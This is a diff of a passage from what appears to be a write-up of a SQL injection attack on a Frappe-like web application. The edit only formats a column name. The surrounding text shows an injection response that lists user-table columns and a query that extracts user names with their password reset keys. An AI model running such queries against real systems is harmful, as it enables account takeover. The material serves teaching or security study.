@@ -203,7 +203,7 @@ Sending that SQL injection payload returns the JSON:
 ```json
 {"message":[{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"name"},...,{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"birth_date"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"reset_password_key"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"email"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"_comments"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"allowed_in_mentions"}]}
 ```
-From the list of columns, we notice reset_password_key. We can use this column name to extract the password reset key. We should also include the name column to ensure that we are obtaining the reset key for the correct user. The query for this is: 
+From the list of columns, we notice `reset_password_key`. We can use this column name to extract the password reset key. We should also include the name column to ensure that we are obtaining the reset key for the correct user. The query for this is: 
 ```sql
 SELECT name COLLATE utf8mb4_general_ci, reset_password_key COLLATE utf8mb4_general_ci
 FROM tabUser;
